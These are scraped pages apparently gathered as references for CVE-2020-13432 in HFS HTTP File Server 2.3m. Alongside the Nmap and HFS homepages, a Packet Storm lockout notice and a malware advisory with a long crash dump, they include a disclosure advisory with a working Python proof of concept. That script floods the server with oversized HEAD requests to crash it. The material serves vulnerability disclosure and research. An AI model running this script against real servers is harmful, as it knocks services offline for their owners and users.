Scripting Engine. They give an overview of NSE, use it to explore Microsoft's global network, write an NSE script from scratch, and hack a webcam--all in 38 minutes! ([Presentation video](/presentations/BHDC10/))* *Icons of the Web*: explore favicons for the top million web sites with our [new poster and online viewer](/favicon).* We're delighted to announce the immediate, free availability of the [Nmap Security Scanner version 5.00](/5/). Don't miss the [top 5 improvements in Nmap 5](/5/#5changes).* After years of effort, we are delighted to release [Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning](/book/)!* We now have an active Nmap [Facebook page](http://facebook.com/nmap) and [Twitter feed](http://twitter.com/nmap/) to augment the [mailing lists](#lists). All of these options offer RSS feeds as well.

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from www.rejetto.com_6d63a326_20250119_123906.html ===


HFS ~ HTTP File Server
![logo](images/hfs-logo.svg)
Serve fresh

* Home
* Install
* Features
* Discuss
* V2
* [â¤ï¸](https://www.paypal.com/donate/?hosted_button_id=HC8MB4GRVU5T2 "Donate")

![logo](images/hfs-logo.svg)
###### Access via web your files directly from your disk

---

* Forever free software.
* You be the server! Share files **fresh from your disk**, with **unlimited** space and bandwidth.
* **Fast!** Try zipping 100GB, downloads starts immediately!
* Share **even a single file** with our *virtual file system*, even with a different name, all without touching the real file. Present things the way you want!
* **Watch** all activities in real-time.
* **Control bandwidth**: decide how much to give.
* **No intermediaries**: give a huge file to your friend without waiting for it to be uploaded on a server first.
* **Intelligent**: HFS tries to detect problems and suggest solutions.
* **Expandable**: find the right plugin, or make you own.

---

Runs on

---

Official release of HFS 3 is expected early this year (2025),

but [current version is already good](https://github.com/rejetto/hfs/) and used by thousands of users.

![](images/hfs-home-light.png)

 ![](images/applight-wave.svg)

### How does it work

1. run HFS on your computer, the administration page automatically shows up
2. select what files and folders you want to make accessible
3. access those files from a phone or another computer just using a browser
4. possibly create accounts to limit access to files

### Install

Follow instructions [on this page](https://github.com/rejetto/hfs?tab=readme-ov-file#installation).

### Watch Now

video contributed by a fellow user

### Features

##### HTTPS

With easy generation of the certificate

##### Resume

for interrupted uploads and downloads

##### Manage

delete, move and rename files

##### Thumbnails

via plugin

 ![](images/hfs-internet-light-mobile.png)

##### Play files

Some files [can be played](https://github.com/rejetto/hfs/discussions/270) directly in-browser

##### Speed throttler

Limit globally or per-IP

##### Geo-firewall

Control access by country

##### Customizable

[HTML/CSS/JS (even backend!)](https://github.com/rejetto/hfs/wiki/Customization)

### Discuss

#### [Report bugs](https://github.com/rejetto/hfs/issues)

Double check it's not you ð¬

#### [Forum](https://github.com/rejetto/hfs/discussions)

Ask questions, share ideas

#### [Old forum](https://rejetto.com/forum/)

Where all started

### Old version (V2)

Version 2.3-2.4 is **dangerous** and should not be used anymore.

A security vulnerability was found allowing an attacker to control your computer.

There is currently no official fix for version 2, but version 3 is not and never has been affected.

#### [Website](/hfs2)

We'll keep it for some time

#### [Documentation](/wiki)

For version 2.x only

#### [Old forum](/forum)

Where all started

All logos and trademarks in this site are property of their respective owner,
all ads are property of respective companies, all the rest © Massimo Melina
- Based on a template by [W3 Template](http://w3Template.com)



=== Content from hyp3rlinx.altervista.org_176cc141_20250119_123858.html ===
[+] Credits: John Page (aka hyp3rlinx)
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/HFS-HTTP-FILE-SERVER-v2.3-REMOTE-BUFFER-OVERFLOW-DoS.txt
[+] twitter.com/hyp3rlinx
[+] ISR: ApparitionSec
[Vendor]
www.rejetto.com
[Product]
HFS Http File Server v2.3m Build 300
[Vulnerability Type]
Remote Buffer Overflow (DoS)
[CVE Reference]
CVE-2020-13432
[Security Issue]
rejetto HFS (aka HTTP File Server) v2.3m Build #300, when virtual
files or folders are used, allows remote attackers to trigger an
invalid-pointer write access violation via concurrent HTTP requests
with a long URI or long HTTP headers like Cookie, User-Agent etc.
Remote unauthenticated attackers can send concurrent HTTP requests
using an incrementing or specific payload range of junk characters for
values in the URL parameters or HTTP headers sent to the server. This
results in hfs.exe server crash from an invalid pointer write access
violation.
Requirements:
hfs.exe must have at least one saved virtual file or folder present.
Test using a remote IP and NOT from the same machine (localhost).
Dump...
(e4c.3a8): Access violation - code c0000005 (first/second chance not available)
For analysis of this file, run !analyze -v
WARNING: Stack overflow detected. The unwound frames are extracted from outside normal stack bounds.
eax=000a1390 ebx=000a138c ecx=006eb188 edx=001b0000 esi=00000000 edi=00000002
eip=777ef8b4 esp=000a0e0c ebp=000a12cc iopl=0 nv up ei pl nz na pe nc
cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00210206
ntdll!RtlpResolveAssemblyStorageMapEntry+0x18:
777ef8b4 53 push ebx
0:000> !load winext/msec
0:000> !exploitable
WARNING: Stack overflow detected. The unwound frames are extracted from outside normal stack bounds.
\*\*\* WARNING: Unable to verify checksum for hfs.exe
Exploitability Classification: EXPLOITABLE
Recommended Bug Title: Exploitable - User Mode Write AV starting at ntdll!RtlpResolveAssemblyStorageMapEntry+0x0000000000000018 (Hash=0x7a29717c.0x325e6a71)
PROCESS\_NAME: hfs.exe
FOLLOWUP\_IP:
hfs+8fad7
0048fad7 8945f0 mov dword ptr [ebp-10h],eax
WRITE\_ADDRESS: 000a0e08
[References]
https://github.com/rejetto/hfs2/releases/tag/v2.4-rc01
[Exploit/POC]
from socket import \*
import time,sys
#HFS HTTP File Server v2.3m build 300.
#Vendor: www.rejetto.com
#Remote Remote Buffer Overflow DoS
#Note: hfs.exe must have at least one saved virtual file or folder on the target
#test using a remote IP and not from the same machine.
#Discovery: hyp3rlinx
#hyp3rlinx.altervista.org
#ISR: ApparitionSec
#=========================================================================
res=""
once=0
cnt=0
max\_requests=1666
def hfs\_dos():
global ip,port,length,res,once,cnt,max\_requests
cnt+=1
length += 1
payload = "A"\*length
try:
s=socket(AF\_INET, SOCK\_STREAM)
s.settimeout(2)
s.connect((ip,port))
##bof ="HEAD / HTTP/1.1\r\nHost: "+ip+"Cookie: "+payload+"\r\n\r\n"
bof ="HEAD /?mode="+payload+" HTTP/1.1\r\nHost: "+ip+"\r\n\r\n"
s.send(bof.encode("utf-8"))
if once==0:
once+=1
res = s.recv(128)
if res != "":
print("Targets up please wait...")
if "HFS 2.3m" not in str(res):
print("[!] Non vulnerable HFS version, exiting :(")
exit()
except Exception as e:
if e != None:
if str(e).find("timed out")!=-1:
if res=="":
print("[!] Target is not up or behind a firewall? :(")
exit()
else:
print("[!] Done!")
exit()
s.close()
if cnt == max\_requests:
return False
return True
def msg():
print("HFS HTTP File Server v2.3m build 300.")
print("Unauthenticated Remote Buffer Overflow (DoS - PoC)")
print("Virtual HFS saved file or folder required.")
print("Run from a different machine (IP) than the target.")
print("By Hyp3rlinx - ApparitionSec\n")
if \_\_name\_\_=="\_\_main\_\_":
length=3
if len(sys.argv) != 3:
msg()
print("Usage: , ")
exit()
ip = sys.argv[1]
port = int(sys.argv[2])
msg()
while True:
if not hfs\_dos():
print("[!] Failed, non vuln version or no virtual files exist :(")
break
[POC Video URL]
https://www.youtube.com/watch?v=qQ-EawfXuWY
[Network Access]
Remote
[Severity]
High
[Disclosure Timeline]
Vendor Notification: May 18, 2020
Vendor reply: May 18, 2020
Vendor confirm vulnerability: May 19, 2020
Vendor creates fix: May 20, 2020
Vendor released new version 2.4 : June 7, 2020
June 8, 2020 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx

=== Content from packetstormsecurity.com_737cd342_20250119_123905.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

LOCKED OUT⛔ 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.

=== Content from seclists.org_3d44b7b0_20250119_123901.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](11)
[By Date](date.html#12)
[![Next](/images/right-icon-16x16.png)](13)

[![Previous](/images/left-icon-16x16.png)](11)
[By Thread](index.html#12)
[![Next](/images/right-icon-16x16.png)](13)

![](/shared/images/nst-icons.svg#search)

# Trojan.Win32.Sharer.h / Known Vulnerable Component - Heap Corruption

---

*From*: malvuln <malvuln13 () gmail com>

*Date*: Sat, 3 Apr 2021 20:57:27 -0400

---

```
Discovery / credits: Malvuln - malvuln.com (c) 2021
Original source:
<https://malvuln.com/advisory/9f80c3b1e7f5f6f7d0c8aea25fe83551_C.txt>
Contact: malvuln13 () gmail com
Media: twitter.com/malvuln

Threat: Trojan.Win32.Sharer.h
Vulnerability: Known Vulnerable Component - Heap Corruption
Description: Sharer.h by GOLDSWORD - www.daokers.cn can run several types
of services, one is a third-party component named "HFS HTTP File Server"
that listens on TCP port 80. The HFS server seems to be a pirated version
of the original by www.rejetto.com as the properties of the executable read
"Copyright DAOKERS.CN" This can be confirmed by running the EXE against
strings util where we find "Http File Server - www.rejetto.com/hfs" value
or simply using the menu about feature when running. This file server has a
known remote buffer overflow vulnerability CVE-2020-13432 which I myself
discovered (hyp3rlinx) last year that targeted v2.3m. However, after
testing this version of the server it is also vulnerable to a remote heap
corruption by sending specially crafted packets to the infected host.
Running the malware you may get missing "picclp32.ocx" error just run it
again and it should work.
Type: PE32
MD5: 9f80c3b1e7f5f6f7d0c8aea25fe83551
Vuln ID: MVID-2021-0160
Dropped files: hfs.exe
ASLR: False
DEP: False
Safe SEH: True
Disclosure: 04/03/2021

Memory Dump:
(25f8.38a4): Access violation - code c0000005 (first/second chance not
available)
eax=000a24b4 ebx=000a1150 ecx=028e0000 edx=00000002 esi=028e0000
edi=00000800
eip=770e2a0e esp=000a0f50 ebp=000a1100 iopl=0         nv up ei pl nz na pe
nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b
efl=00210206
ntdll!RtlpAllocateHeap+0x1e:
770e2a0e 53              push    ebx

0:000> !analyze -v
*******************************************************************************
*
  *
*                        Exception Analysis
  *
*
  *
*******************************************************************************

*** WARNING: Unable to verify checksum for hfs.exe
*** ERROR: Module load completed but symbols could not be loaded for hfs.exe
Failed calling InternetOpenUrl, GLE=12029

FAULTING_IP:
ntdll!RtlpAllocateHeap+1e
770e2a0e 53              push    ebx

EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 770e2a0e (ntdll!RtlpAllocateHeap+0x0000001e)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000001
   Parameter[1]: 000a0f4c
Attempt to write to address 000a0f4c

PROCESS_NAME:  hfs.exe

ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced
memory at 0x%p. The memory could not be %s.

EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced
memory at 0x%p. The memory could not be %s.

EXCEPTION_PARAMETER1:  00000001

EXCEPTION_PARAMETER2:  000a0f4c

WRITE_ADDRESS:  000a0f4c

FOLLOWUP_IP:
ntdll!RtlpAllocateHeap+1e
770e2a0e 53              push    ebx

MOD_LIST: <ANALYSIS/>

NTGLOBALFLAG:  0

APPLICATION_VERIFIER_FLAGS:  0

ADDITIONAL_DEBUG_TEXT:  Enable Pageheap/AutoVerifer

FAULTING_THREAD:  000038a4

DEFAULT_BUCKET_ID:  HEAP_CORRUPTION

PRIMARY_PROBLEM_CLASS:  HEAP_CORRUPTION

BUGCHECK_STR:
 APPLICATION_FAULT_HEAP_CORRUPTION_INVALID_STACK_ACCESS_INVALID_POINTER_WRITE_EXPLOITABLE

LAST_CONTROL_TRANSFER:  from 770e16b7 to 770e2a0e

STACK_TEXT:
000a1100 770e16b7 00000800 00000808 028e9050 ntdll!RtlpAllocateHeap+0x1e
000a1150 770e13ee 00000000 00000000 02997398
ntdll!RtlpAllocateHeapInternal+0x2b7
000a1168 7630190d 028e0000 00000000 00000800 ntdll!RtlAllocateHeap+0x3e
000a1180 7630110d 00000800 02997398 00000000 gdi32full!UspAllocCache+0x2d
000a11b0 76300f53 00000000 02997328 0401385b
gdi32full!InitializeMetricBlock+0x4a
000a14d8 76300e89 00000000 00000040 00000024
gdi32full!LoadGlyphMetricsWithGetCharABCWidthsI+0x70
000a14f8 763001c4 00000024 00000001 000a1708 gdi32full!LoadGlyphMetrics+0x73
000a152c 762fcea3 0290d52c 00000006 0290d5c8
gdi32full!GetGlyphAdvanceWidths+0xd4
000a1558 762f9911 000a16e8 0290d52c 00000006
gdi32full!CUspShapingFont::GetGlyphDefaultAdvanceWidths+0x23
000a1644 762f9348 000a16f0 00000000 00000000
gdi32full!ShapingGetGlyphPositions+0x1e1
000a1788 762f6cb9 0401385b 0290d294 0290d52c gdi32full!ShlPlaceOT+0x218
000a1820 762f6596 00000000 000a18d0 0290d170
gdi32full!RenderItemNoFallback+0x409
000a1860 762f6448 00000000 000a18d0 00000000
gdi32full!RenderItemWithFallback+0x126
000a1888 762f61de 00000000 000a18d0 0290d270 gdi32full!RenderItem+0x28
000a18e0 762f3f84 0401385b 01800009 000010a2
gdi32full!ScriptStringAnalyzeGlyphs+0x1be
000a1d44 762f1596 0401385b 04b57f78 00000006
gdi32full!ScriptStringAnalyse+0x734
000a1efc 762f0db0 762f0d80 762f0d80 00000030 gdi32full!LpkCharsetDraw+0x626
000a1f28 76f36844 0401385b 00000000 00000000 gdi32full!LpkDrawTextEx+0x30
000a1f8c 76f36b38 00000000 04b57f78 00000006 user32!DT_DrawStr+0x72
000a1fec 76edd8fb 00000058 00002e50 000a2034 user32!DT_GetLineBreak+0xa2
000a20a4 76f214cd ffffffff 000a20f4 00002e50 user32!DrawTextExWorker+0x32b
000a2120 76f400be 02cf3490 00000000 00000032 user32!MB_CalcDialogSize+0x10c
000a2204 73ee39ec 000a2370 76f22093 000a2388
user32!SoftModalMessageBox+0x3ae
000a220c 76f22093 000a2388 04b57f78 00000000
win32u!NtUserModifyUserStartupInfoFlags+0xc
000a2450 6b0bf698 000218b0 0437c930 043bede8 user32!MessageBoxWorker+0x29a
000a2474 6b0c033c 000218b0 0437c930 043bede8 apphelp!MbHook_MessageBoxA+0x38
000a249c 00489f7b 000218b0 0437c930 043bede8 apphelp!SrHook_MessageBoxA+0x3c
WARNING: Stack unwind information not available. Following frames may be
wrong.
000a2520 0048a093 00000010 000a42d4 0048a0b4 hfs+0x89f7b
000a2648 004bf174 004bf184 00000020 ffffffff hfs+0x8a093
000a2668 00489e49 0046b7b1 04292190 0438f460 hfs+0xbf174
000a267c 0046b7c0 00000000 6aa8ad67 043b26b0 hfs+0x89e49
000a42f4 00429f36 000000c2 00000000 043b2640 hfs+0x6b7c0
000a430c 76eee0bb 00031b30 000000c2 00000000 hfs+0x29f36
000a4338 76ef8849 02730e83 00031b30 000000c2
user32!_InternalCallWinProc+0x2b
000a435c 76efb145 000000c2 00000000 043b2640 user32!InternalCallWinProc+0x20
000a442c 76efa89c 02730e83 00000000 000000c2
user32!UserCallWinProcCheckWow+0x1be
000a4498 76edab54 02f9dee0 00000000 043b2640 user32!SendMessageWorker+0x6ff
000a44b8 00442016 00031b30 000000c2 00000000 user32!SendMessageA+0x54
000a44d8 00519853 000a4568 00519920 000a455c hfs+0x42016
000a455c 0051aa64 00000000 000a4618 0051ae77 hfs+0x119853
000a460c 0051d400 000a4660 000a467c 0051d41c hfs+0x11aa64
000a4660 004eda33 066cf540 000a4674 004ef995 hfs+0x11d400
000a466c 004ef995 000a46bc 004eee5e 000a46c4 hfs+0xeda33
000a4674 004eee5e 000a46c4 004ef0c2 000a46bc hfs+0xef995
000a46bc 004ef20c 000a46f4 004ef222 000a46dc hfs+0xeee5e
000a46dc 004c7c16 0671db40 0671db40 000a472c hfs+0xef20c
000a46ec 004c9680 000a476c 004c9cdb 000a472c hfs+0xc7c16
000a472c 004ca581 00000401 000a4c38 0671db01 hfs+0xc9680
000a4764 004c4727 000a4ba8 004c47d2 000a4b90 hfs+0xca581
000a4b90 004c4873 000a4c38 0671db40 000a4be8 hfs+0xc4727
000a4ba0 004c4b61 000a4bf0 004c4beb 000a4be8 hfs+0xc4873
000a4be8 004c364e 000a4d58 004c36e5 000a4c0c hfs+0xc4b61
000a4c0c 004ca0e0 00000401 009107b8 0671db40 hfs+0xc364e
000a4c24 004c3784 004c3730 009107b8 00000000 hfs+0xca0e0
000a4c48 76eee0bb 009107b8 00000401 00000388 hfs+0xc3784
000a4c74 76ef8849 004c3730 009107b8 00000401
user32!_InternalCallWinProc+0x2b
000a4c98 76efb145 00000401 00000388 00000001 user32!InternalCallWinProc+0x20
000a4d68 76ee90dc 004c3730 00000000 00000401
user32!UserCallWinProcCheckWow+0x1be
000a4dd4 76ee38c0 000a4df8 00489a13 000a4e00
user32!DispatchMessageWorker+0x4ac
000a4ddc 00489a13 000a4e00 0437c990 01000001 user32!DispatchMessageA+0x10
000a4df8 00489a3c 009107b8 00000401 00000388 hfs+0x89a13
000a4e20 0051150d 042e8b70 000a4fc0 00511ebc hfs+0x89a3c
000a4e2c 00511ebc 000a5018 000a4fcc 00512089 hfs+0x11150d
000a4fc0 00512255 000a5018 000a4fd8 00512281 hfs+0x111ebc
000a5018 00516989 00000000 00000001 ffffffff hfs+0x112255
000a5234 0051c787 000a5274 043b3510 000a52c4 hfs+0x116989
000a52b8 0051cf7a 000a530c 000a5328 0051d41c hfs+0x11c787
000a530c 004eda33 066cdd80 000a5320 004ef995 hfs+0x11cf7a
000a5318 004ef995 000a5368 004eee5e 000a5370 hfs+0xeda33
000a5320 004eee5e 000a5370 004ef0c2 000a5368 hfs+0xef995
000a5368 004ef20c 000a53a0 004ef222 000a5388 hfs+0xeee5e
000a5388 004c7c16 0671f070 0671f070 000a53d8 hfs+0xef20c
000a5398 004c9680 000a5418 004c9cdb 000a53d8 hfs+0xc7c16
000a53d8 004ca581 00000401 000a58e4 0671f001 hfs+0xc9680
000a5410 004c4727 000a5854 004c47d2 000a583c hfs+0xca581
000a583c 004c4873 000a58e4 0671f070 000a5894 hfs+0xc4727
000a584c 004c4b61 000a589c 004c4beb 000a5894 hfs+0xc4873
000a5894 004c364e 000a5a04 004c36e5 000a58b8 hfs+0xc4b61
000a58b8 004ca0e0 00000401 00c31614 0671f070 hfs+0xc364e
000a58d0 004c3784 004c3730 00c31614 00000000 hfs+0xca0e0
000a58f4 76eee0bb 00c31614 00000401 00000388 hfs+0xc3784
000a5920 76ef8849 004c3730 00c31614 00000401
user32!_InternalCallWinProc+0x2b
000a5944 76efb145 00000401 00000388 00000001 user32!InternalCallWinProc+0x20
000a5a14 76ee90dc 004c3730 00000000 00000401
user32!UserCallWinProcCheckWow+0x1be
000a5a80 76ee38c0 000a5aa4 00489a13 000a5aac
user32!DispatchMessageWorker+0x4ac
000a5a88 00489a13 000a5aac 0437c990 01000001 user32!DispatchMessageA+0x10
000a5aa4 00489a3c 00c31614 00000401 00000388 hfs+0x89a13
000a5acc 0051150d 042e6e60 000a5c6c 00511ebc hfs+0x89a3c
000a5ad8 00511ebc 000a5cc4 000a5c78 00512089 hfs+0x11150d
000a5c6c 00512255 000a5cc4 000a5c84 00512281 hfs+0x111ebc
000a5cc4 00516989 00000000 00000001 ffffffff hfs+0x112255
000a5ee0 0051c787 000a5f20 043b3510 000a5f70 hfs+0x116989
000a5f64 0051cf7a 000a5fb8 000a5fd4 0051d41c hfs+0x11c787
000a5fb8 004eda33 066cf400 000a5fcc 004ef995 hfs+0x11cf7a
000a5fc4 004ef995 000a6014 004eee5e 000a601c hfs+0xeda33
000a5fcc 004eee5e 000a601c 004ef0c2 000a6014 hfs+0xef995
000a6014 004ef20c 000a604c 004ef222 000a6034 hfs+0xeee5e
000a6034 004c7c16 06717f70 06717f70 000a6084 hfs+0xef20c
000a6044 004c9680 000a60c4 004c9cdb 000a6084 hfs+0xc7c16
000a6084 004ca581 00000401 000a6590 06717f01 hfs+0xc9680
000a60bc 004c4727 000a6500 004c47d2 000a64e8 hfs+0xca581
000a64e8 004c4873 000a6590 06717f70 000a6540 hfs+0xc4727
000a64f8 004c4b61 000a6548 004c4beb 000a6540 hfs+0xc4873
000a6540 004c364e 000a66b0 004c36e5 000a6564 hfs+0xc4b61
000a6564 004ca0e0 00000401 005d1b4e 06717f70 hfs+0xc364e
000a657c 004c3784 004c3730 005d1b4e 00000000 hfs+0xca0e0
000a65a0 76eee0bb 005d1b4e 00000401 00000388 hfs+0xc3784
000a65cc 76ef8849 004c3730 005d1b4e 00000401
user32!_InternalCallWinProc+0x2b
000a65f0 76efb145 00000401 00000388 00000001 user32!InternalCallWinProc+0x20
000a66c0 76ee90dc 004c3730 00000000 00000401
user32!UserCallWinProcCheckWow+0x1be
000a672c 76ee38c0 000a6750 00489a13 000a6758
user32!DispatchMessageWorker+0x4ac
000a6734 00489a13 000a6758 0437c990 01000001 user32!DispatchMessageA+0x10
000a6750 00489a3c 005d1b4e 00000401 00000388 hfs+0x89a13
000a6778 0051150d 042e7c70 000a6918 00511ebc hfs+0x89a3c
000a6784 00511ebc 000a6970 000a6924 00512089 hfs+0x11150d
000a6918 00512255 000a6970 000a6930 00512281 hfs+0x111ebc
000a6970 00516989 00000000 00000001 ffffffff hfs+0x112255
000a6b8c 0051c787 000a6bcc 043b3510 000a6c1c hfs+0x116989
000a6c10 0051cf7a 000a6c64 000a6c80 0051d41c hfs+0x11c787
000a6c64 004eda33 066f49e0 000a6c78 004ef995 hfs+0x11cf7a
000a6c70 004ef995 000a6cc0 004eee5e 000a6cc8 hfs+0xeda33
000a6c78 004eee5e 000a6cc8 004ef0c2 000a6cc0 hfs+0xef995
000a6cc0 004ef20c 000a6cf8 004ef222 000a6ce0 hfs+0xeee5e
000a6ce0 004c7c16 0671cd20 0671cd20 000a6d30 hfs+0xef20c
000a6cf0 004c9680 000a6d70 004c9cdb 000a6d30 hfs+0xc7c16
000a6d30 004ca581 00000401 000a723c 0671cd01 hfs+0xc9680
000a6d68 004c4727 000a71ac 004c47d2 000a7194 hfs+0xca581
000a7194 004c4873 000a723c 0671cd20 000a71ec hfs+0xc4727
000a71a4 004c4b61 000a71f4 004c4beb 000a71ec hfs+0xc4873
000a71ec 004c364e 000a735c 004c36e5 000a7210 hfs+0xc4b61
000a7210 004ca0e0 00000401 00a619f8 0671cd20 hfs+0xc364e
000a7228 004c3784 004c3730 00a619f8 00000000 hfs+0xca0e0
000a724c 76eee0bb 00a619f8 00000401 00000384 hfs+0xc3784
000a7278 76ef8849 004c3730 00a619f8 00000401
user32!_InternalCallWinProc+0x2b
000a729c 76efb145 00000401 00000384 00000001 user32!InternalCallWinProc+0x20
000a736c 76ee90dc 004c3730 00000000 00000401
user32!UserCallWinProcCheckWow+0x1be
000a73d8 76ee38c0 000a73fc 00489a13 000a7404
user32!DispatchMessageWorker+0x4ac
000a73e0 00489a13 000a7404 0437c990 01000001 user32!DispatchMessageA+0x10
000a73fc 00489a3c 00a619f8 00000401 00000384 hfs+0x89a13
